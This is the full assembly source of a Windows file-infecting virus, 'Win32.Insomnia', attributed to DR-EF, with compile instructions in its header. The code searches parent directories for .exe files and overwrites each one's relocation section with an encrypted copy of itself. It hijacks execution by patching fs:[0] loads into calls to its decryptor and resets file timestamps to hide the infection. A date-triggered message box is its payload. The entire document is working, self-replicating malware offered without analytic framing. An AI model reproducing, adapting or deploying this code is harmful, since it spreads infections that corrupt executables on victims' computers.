;	Win32.Insomnia (c) DR-EF.
;--------------------------------------------------
;virus name:Win32.Insomnia
;virus author:DR-EF
;virus size:1972 bytes
;features:
;	o dont increase file size,overwrite reloc 
;	  section instead.
;	o use EPO - replace all mov eax,fs:[00000000]
;	  instructions with call virus decryptor.
;	o encrypted with new key for each file.
;	o use the dotdot method to find files.
;payload:messagebox with this text:
;	".:[Win32.Insomnia � 2004 DR-EF]:."
;	every year at 29/12.
;compile:
;	tasm32 /m3 /ml /zi Insomnia.asm , , ;
;	tlink32 /tpe /aa /v Insomnia , Insomnia,,import32.lib
;	pewrsec Insomnia.exe
;--------------------------------------------------

.386
.model flat

	extrn ExitProcess:proc

	virus_size equ (EndVirus-virus_start)
	INVALID_HANDLE_VALUE	equ	-1
	FILE_ATTRIBUTE_NORMAL	equ	00000080h
	OPEN_EXISTING	equ	3
	GENERIC_WRITE	equ	40000000h
	GENERIC_READ	equ	80000000h
	PAGE_READWRITE	equ	4h
	FILE_MAP_WRITE	equ	00000002h

.data
	db	?
.code

virus_start:
	call	Delta
Delta:	pop	ebp
	sub	ebp,offset Delta
	mov	ecx,NumberOfKernelBases
	lea	esi,[ebp + KernelBaseTable]
@next_k:lodsd
	call	GetKernel32Base
	jc	GetApis
	loop	@next_k
	jmp	reth	;return to host
KernelBaseTable:
	dd	804d4000h	;winXP
	dd	0bff60000h	;winME
	dd	77f00000h	;winNT
	dd	77e70000h	;win2K
	dd	0bff70000h	;win9X
	NumberOfKernelBases	equ	5h
	
GetApis:mov	eax,[ebp + kernel32base]
	add	eax,[eax + 3ch]
	mov	eax,[eax + 78h]
	add	eax,[ebp + kernel32base]
	;eax - kernel32 export table
	push	eax
	xor	edx,edx
	mov	eax,[eax + 20h]
	add	eax,[ebp + kernel32base]
	mov	edi,[eax]
	add	edi,[ebp + kernel32base]
	;edi - api names array
	dec	edi
nxt_cmp:inc	edi
	lea	esi,[ebp + _GetProcAddress]
	mov	ecx,0eh
	rep	cmpsb
	je	search_address
	inc	edx
nxt_l:	cmp	byte ptr [edi],0h
	je	nxt_cmp
	inc	edi
	jmp	nxt_l
search_address:
	pop	eax
	;eax - kernel32 export table
	;edx - GetProcAddress position
	shl	edx,1h
	mov	ebx,[eax + 24h]
	add	ebx,[ebp + kernel32base]
	add	ebx,edx
	mov	dx,word ptr [ebx]
	shl	edx,2h
	mov	ebx,[eax + 1ch]
	add	ebx,[ebp + kernel32base]
	add	ebx,edx
	mov	ebx,[ebx]
	add	ebx,[ebp + kernel32base]
	mov	[ebp + GetProcAddress],ebx
	mov	ecx,NumberOfApis
	lea	eax,[ebp + ApiNamesTable]
	lea	ebx,[ebp + ApiAddressTable]
nxt_api:push	ecx
	push	eax
	push	eax
	push	[ebp + kernel32base]
	call	[ebp + GetProcAddress]
	or	eax,eax
	je	api_err
	mov	dword ptr [ebx],eax
	pop	eax
nxt_al:	inc	eax
	cmp	byte ptr [eax],0h
	jne	nxt_al
	inc	eax
	add	ebx,4h
	pop	ecx
	loop	nxt_api
	jmp	InfectFiles
api_err:add	esp,8h
	jmp	reth
	
	_GetProcAddress	db	"GetProcAddress",0
	GetProcAddress	dd	0
	kernel32base	dd	0
	
ApiNamesTable:
	_FindFirstFile	db	"FindFirstFileA",0
	_FindNextFile	db	"FindNextFileA",0
	_GetCurrentDirectory	db	"GetCurrentDirectoryA",0
	_SetCurrentDirectory	db	"SetCurrentDirectoryA",0
	_CreateFile	db	"CreateFileA",0
	_CloseHandle	db	"CloseHandle",0
	_CreateFileMapping	db "CreateFileMappingA",0
	_MapViewOfFile	db 	"MapViewOfFile",0
	_UnmapViewOfFile	db 	"UnmapViewOfFile",0
	_GetLocalTime	db	"GetLocalTime",0
	_LoadLibrary	db	"LoadLibraryA",0
	_SetFileTime	db	"SetFileTime",0
	
ApiAddressTable:
	FindFirstFile	dd	0
	FindNextFile	dd	0
	GetCurrentDirectory	dd	0
	SetCurrentDirectory	dd	0
	CreateFile	dd	0
	CloseHandle	dd	0
	CreateFileMapping	dd	0
	MapViewOfFile	dd	0
	UnmapViewOfFile	dd	0
	GetLocalTime	dd	0
	LoadLibrary	dd	0
	SetFileTime	dd	0
	
	NumberOfApis	equ	12
	
GetKernel32Base:
	pushad
	lea	ebx,[ebp + k32err]
	push	ebx
	xor	ebx,ebx
	push	dword ptr fs:[ebx]
	mov	fs:[ebx],esp
	mov	ebx,eax
	cmp	word ptr [eax],"ZM"
	jne	_k32err
	add	eax,[eax + 3ch]
	cmp	word ptr [eax],"EP"
	jne	_k32err
	mov	[ebp + kernel32base],ebx
	pop	dword ptr fs:[0]
	add	esp,4h
	popad
	stc
	ret
_k32err:pop	dword ptr fs:[0]
	add	esp,4h
	popad
	clc
	ret
k32err:	mov	esp,[esp + 8h]
	pop	dword ptr fs:[0]
	add	esp,4h
	popad
	clc
	ret

VirusCopyRight	db	".:[Win32.Insomnia � 2004 DR-EF]:.",0

InfectFiles:
	mov	[ebp + max_dirs],0fh
	lea	eax,[ebp + cdir]
	push	eax
	push	0ffh
	call	[ebp + GetCurrentDirectory]
	or	eax,eax
	je	ReturnToHost
s_files:cmp	[ebp + max_dirs],0h
	je	r_dir
	lea	eax,[ebp + WIN32_FIND_DATA]
	push	eax
	lea	eax,[ebp + search_mask]
	push	eax
	call	[ebp + FindFirstFile]
	cmp	eax,INVALID_HANDLE_VALUE
	je	nxt_dir
	mov	[ebp + hfind],eax
i_file:	call	InfectFile
	lea	eax,[ebp + WIN32_FIND_DATA]
	push	eax
	push	[ebp + hfind]
	call	[ebp + FindNextFile]
	or	eax,eax
	jne	i_file
nxt_dir:dec	[ebp + max_dirs]
	lea	eax,[ebp + dotdot]
	push	eax
	call	[ebp + SetCurrentDirectory]
	or	eax,eax
	jne	s_files
r_dir:	lea	eax,[ebp + cdir]
	push	eax
	call	[ebp + SetCurrentDirectory]
ReturnToHost:
	;check for payload:
	lea	eax,[ebp + SYSTEMTIME]
	push	eax
	call	[ebp + GetLocalTime]
	cmp	word ptr [ebp + wMonth],0ch
	jne	reth
	cmp	word ptr [ebp + wDay],1dh
	jne	reth
	lea	eax,[ebp + user32dll]
	push	eax
	call	[ebp + LoadLibrary]
	or	eax,eax
	je	reth
	lea	ebx,[ebp + MessageBox]
	push	ebx
	push	eax
	call	[ebp + GetProcAddress]
	or	eax,eax
	je	reth
	xor	ecx,ecx
	push	MB_ICONINFORMATION or MB_SYSTEMMODAL
	push	ecx
	lea	ebx,[ebp + VirusCopyRight]
	push	ebx
	push	ecx
	call	eax
reth:	popfd
	popad
	db	64h,0A1h,0,0,0,0 ;mov eax,fs:[00000000]
	ret
	
	
	SYSTEMTIME:
	wYear	dw	0
	wMonth	dw	0
	wDayOfWeek	dw	0
	wDay	dw	0
	wHour	dw	0
	wMinute	dw	0
	wSecond	dw	0
	wMilliseconds	dw	0
	
	user32dll	db	"user32.dll",0
	MessageBox	db	"MessageBoxA",0
	MB_SYSTEMMODAL	equ	00001000h
	MB_ICONINFORMATION	equ	00000040h
	
	
	hfind	dd	0
	max_dirs	db	0fh
	search_mask	db	"*.exe",0
	dotdot	db	"..",0
	cdir	db	0ffh	dup(0)
	
	
	WIN32_FIND_DATA:
	dwFileAttributes	dd	0
	ftCreationTime		dq	0
	ftLastAccessTime	dq	0
	ftLastWriteTime		dq	0
	nFileSizeHigh		dd	0
	nFileSizeLow		dd	0
	dwReserved0		dd      0
	dwReserved1		dd      0
	cFileName		db      0ffh dup (0)
	cAlternateFileName	db	20 dup (0)
	
	
InfectFile:
	inc	byte ptr [ebp + decrypt_key]	;create new key
	lea	ebx,[ebp + cFileName]
	xor	eax,eax
	push	eax
	push	FILE_ATTRIBUTE_NORMAL
	push	OPEN_EXISTING
	push	eax
	push	eax
	push	GENERIC_READ or GENERIC_WRITE
	push	ebx
	call	[ebp + CreateFile]
	cmp	eax,INVALID_HANDLE_VALUE
	je	ExitInfect
	mov	[ebp + hfile],eax
	xor	eax,eax
	push	eax
	push	eax
	push	eax
	push	PAGE_READWRITE
	push	eax
	push	[ebp + hfile]
	call	[ebp + CreateFileMapping]
	or	eax,eax
	je	close_f
	mov	[ebp + hmap],eax
	xor	eax,eax
	push	eax
	push	eax
	push	eax
	push	FILE_MAP_WRITE
	push	[ebp + hmap]
	call	[ebp + MapViewOfFile]
	or	eax,eax
	je	close_m
	mov	[ebp + mapbase],eax
	;check for valid pe file
	cmp	word ptr [eax],"ZM"
	jne	CloseFile
	add	eax,[eax + 3ch]
	cmp	word ptr [eax],"EP"
	jne	CloseFile
	;goto sections table
	mov	cx,[eax + 6h] ; get number of sections
	and	ecx,0ffffh
	mov	ebx,[eax + 34h];get image base
	mov	dword ptr [ebp + Virus_Start],ebx ;save image base insaid decryptor
	mov	ebx,[eax + 74h];get number of datadirectory
	shl	ebx,3h
	add	eax,ebx
	add	eax,78h
	push	eax	;eax - sections table
	push	ecx	;ecx - number of sections
	;check for reloc section
@sec:	cmp	dword ptr [eax],"ler."
	jne	nxt_sec
	cmp	dword ptr [eax + 2h],"cole"
	je	f_rec
nxt_sec:add	eax,28h
	loop	@sec
ext_rlc:add	esp,8h	;restore stack
	jmp	CloseFile
	;check if the reloc section is bigger than virus
f_rec:	cmp	dword ptr [eax + 8h],virus_size	;eax - reloc section header !
	jb	ext_rlc
	;set new section flags
	or	dword ptr [eax + 24h],0c0000020h ;code\readable\writeable
	;goto the section raw data:
	mov	edx,[eax + 0ch]
	mov	eax,[eax + 14h]
	add	eax,[ebp + mapbase]
	;overwrite the reloc section with the virus
	mov	edi,eax
	lea	esi,[ebp + virus_start]
	mov	ecx,virus_size
@enc:	lodsb
	xor	al,byte ptr [ebp + decrypt_key]
	stosb
	loop	@enc
	pop	ecx ;ecx - number of sections
	pop	ebx ;ebx - sections table
	sub	eax,[ebp + mapbase]
	add	dword ptr [ebp + Virus_Start],edx ;eax - virus start infected files
@sec2:	cmp	dword ptr [ebx + 1h],"txet" ;text ?
	je	f_cod
	cmp	dword ptr [ebx + 1h],"edoc" ;code ?
	je	f_cod
	cmp	dword ptr [ebx],"EDOC"	;CODE ?
	je	f_cod
	add	ebx,28h
	loop	@sec2
	add	esp,4h	;restore stack
	jmp	CloseFile
	;ebx - code section header
f_cod:	mov	ecx,[ebx + 10h] ;ecx - size of section raw data
	mov	edx,[ebx + 8h]	;edx - virtual section size
	sub	ecx,edx
	cmp	ecx,DecryptorSize
	ja	write_d
	add	esp,4h
	jmp	CloseFile
write_d:mov	edi,[ebx + 14h]
	mov	[ebp + virus_entry_point],edi
	add	[ebp + virus_entry_point],edx
	add	edi,[ebp + mapbase]
	push	edi	;save code section raw data
	add	edi,edx	;esi - where to write virus decryptor
	lea	esi,[ebp + VirusDecryptorStart]
	mov	ecx,DecryptorSize
	rep	movsb
	pop	esi	;esi - code section raw data
	;search for all mov eax,fs:[00000000] and replace it with nop --> call virus_decryptor
	xchg	edx,ecx	;ecx - code section virtual size
@1:	cmp	word ptr [esi],0a164h
	jne	nxt_w
	cmp	dword ptr [esi + 2],0
	jne	nxt_w
	;esi - mov eax,fs:[00000000] location.
	mov	byte ptr [esi],90h	;nop
	mov	byte ptr [esi + 1h],0e8h;call
	mov	eax,[ebp + virus_entry_point]
	mov	ebx,esi
	sub	ebx,[ebp + mapbase]
	sub	eax,ebx
	sub	eax,6h
	mov	dword ptr [esi + 2h],eax
nxt_w:	inc	esi
	loop	@1
CloseFile:
	push	[ebp + mapbase]
	call	[ebp + UnmapViewOfFile]
close_m:push	[ebp + hmap]
	call	[ebp + CloseHandle]
close_f:lea	eax,[ebp + ftLastWriteTime]
	push	eax
	lea	eax,[ebp + ftLastAccessTime]
	push	eax
	lea	eax,[ebp + ftCreationTime]
	push	eax
	push	[ebp + hfile]
	call	[ebp + SetFileTime]
	push	[ebp + hfile]
	call	[ebp + CloseHandle]
ExitInfect:
	ret

VirusDecryptorStart	equ	$
	pushad
	pushfd
	mov	esi,00000000
	Virus_Start	equ	$-4
	push	esi
	mov	edi,esi
	mov	ecx,virus_size
@dcrypt:lodsb
	xor	al,5h
	decrypt_key	equ	$-1
	stosb
	loop	@dcrypt
	ret
EndVirusDecryptor	equ	$
DecryptorSize	equ	(EndVirusDecryptor - VirusDecryptorStart)
	
	hfile	dd	0
	hmap	dd	0
	mapbase	dd	0
	virus_entry_point	dd	0

EndVirus	equ	$

First_Gen_Host:
	push	offset exit
	pushfd
	pushad
	jmp	virus_start
exit:	push	eax
	call	ExitProcess
end First_Gen_Host
